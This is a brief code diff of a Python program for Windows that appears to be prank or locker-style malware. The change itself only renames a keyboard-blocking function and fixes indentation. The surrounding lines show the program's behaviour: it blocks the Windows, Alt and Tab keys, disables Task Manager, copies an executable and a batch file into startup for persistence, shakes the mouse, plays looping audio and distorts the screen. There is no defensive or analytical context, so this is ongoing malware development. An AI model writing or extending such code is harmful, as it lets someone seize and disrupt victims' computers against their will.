@@ -160,7 +160,7 @@ def add_exe_to_startup():
     except Exception as e:
         print("fuck:", e)
 
-def keyborad():
+def keyboard2():
     keyboard.block_key('windows')
     keyboard.block_key('alt')
     keyboard.block_key('tab')
@@ -410,10 +410,10 @@ def apply_screen_effects_and_shake_mouse():
         bitmap.DeleteObject()
 
 if __name__ == "__main__":
-	show_warning_and_check()
+    show_warning_and_check()
     last()
     textFile()
-    keyborad()
+    keyboard2()
     drawing_thread5 = threading.Thread(target=shake_mouse_continuous)
     drawing_thread5.start()
     disable_task_manager()
@@ -458,6 +458,4 @@ if __name__ == "__main__":
     extract_and_copy_exe()
     add_batch_to_startup()
     threading.Thread(target=bytebeat_audio_loop, daemon=True).start()
-
     apply_screen_effects_and_shake_mouse()
-
